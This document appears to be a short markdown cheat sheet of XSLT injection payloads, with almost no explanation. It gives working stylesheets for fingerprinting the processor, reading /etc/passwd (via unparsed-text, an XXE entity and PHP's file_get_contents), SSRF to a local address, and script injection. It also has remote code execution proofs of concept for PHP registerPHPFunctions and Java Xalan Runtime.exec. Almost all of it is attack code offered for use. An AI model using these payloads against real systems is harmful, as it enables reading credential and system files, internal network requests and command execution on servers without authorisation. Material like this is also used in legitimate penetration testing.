

## detection


```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:output method="html"/>
<xsl:template match="/">
    <h2>XSLT identification</h2>
    <b>Version:</b> <xsl:value-of select="system-property('xsl:version')"/><br/>
    <b>Vendor:</b> <xsl:value-of select="system-property('xsl:vendor')" /><br/>
    <b>Vendor URL:</b><xsl:value-of select="system-property('xsl:vendor-url')" /><br/>
</xsl:template>
</xsl:stylesheet>
```


## read file


```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:abc="http://php.net/xsl" version="1.0">
<xsl:template match="/">
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')"/>
</xsl:template>
</xsl:stylesheet>
```


## SSRF

```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:abc="http://php.net/xsl" version="1.0">
<xsl:include href="http://127.0.0.1:5000/xslt"/>
<xsl:template match="/">
</xsl:template>
</xsl:stylesheet>
```

## js injection
```
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
<script>confirm("We're good");</script>
</xsl:template>
</xsl:stylesheet>
```

## xxe
```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE dtd_sample[<!ENTITY ext_file SYSTEM "/etc/passwd">]>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
&ext_file;
</xsl:template>
</xsl:stylesheet>
```

## RCE 
-if can control the input of xsl 

### PHP
- if registerPHPFunctions is enabled 
```php
<?php
$xml = <<<EOB
<allusers>
 <user>
  <uid>bob</uid>
 </user>
 <user>
  <uid>joe</uid>
 </user>
</allusers>
EOB;

$xsl = <<<EOB
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:php="http://php.net/xsl">
<xsl:output method="html" encoding="utf-8" indent="yes"/>
 <xsl:template match="allusers">
  <html><body>
    <h2>Users</h2>
    <table>
    <xsl:for-each select="user">
      <tr><td>
        <xsl:value-of
             select="php:function('file_get_contents', '/etc/passwd' )"/>
      </td></tr>
    </xsl:for-each>
    </table>
  </body></html>
 </xsl:template>
</xsl:stylesheet>
EOB;

$xmldoc = new DOMDocument();
$xmldoc->loadXML($xml);

$xsldoc = new DOMDocument();
$xsldoc->loadXML($xsl);

$proc = new XSLTProcessor();
$proc->registerPHPFunctions();
$proc->importStyleSheet($xsldoc);

echo $proc->transformToXML($xmldoc);
?>
```

### Java
-if using XSLT processor 
```java
import javax.xml.transform.*;

import javax.xml.transform.stream.StreamResult;

import javax.xml.transform.stream.StreamSource;

import java.io.StringWriter;

  

public class XSLTTransformationExample {

public static void main(String[] args) {

try {

// XML content

String xmlContent = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +

"<root></root>";

  

// XSLT content

String xsltContent = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +

"<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"\n" +

" xmlns:rt=\"http://xml.apache.org/xalan/java/java.lang.Runtime\"\n" +

" xmlns:ob=\"http://xml.apache.org/xalan/java/java.lang.Object\">\n" +

" <xsl:template match=\"/\">\n" +

" <xsl:variable name=\"rtObject\" select=\"rt:getRuntime()\"/>\n" +

" <xsl:variable name=\"process\" select=\"rt:exec($rtObject, 'touch poc.txt')\"/>\n" +

" <xsl:variable name=\"processString\" select=\"ob:toString($process)\"/>\n" +

" <xsl:value-of select=\"$processString\"/>\n" +

" </xsl:template>\n" +

"</xsl:stylesheet>";

  

// Create a TransformerFactory

TransformerFactory transformerFactory = TransformerFactory.newInstance();

  

// Enable Xalan extensions

System.setProperty("javax.xml.transform.TransformerFactory",

"org.apache.xalan.processor.TransformerFactoryImpl");

  

// Create a Transformer from the XSLT content

Transformer transformer = transformerFactory.newTransformer(

new StreamSource(new java.io.StringReader(xsltContent)));

  

// Perform the transformation and capture the output

StringWriter outputWriter = new StringWriter();

transformer.transform(new StreamSource(new java.io.StringReader(xmlContent)),

new StreamResult(outputWriter));

  

// Print the output

String output = outputWriter.toString();

System.out.println(output);

  

System.out.println("Transformation complete.");

} catch (TransformerException e) {

e.printStackTrace();

}

}

}
```

## tools 

-use tool saxonb-xslt to parse xml
-ex: saxonb-xslt -xsl:transformation.xsl catalogue.xml
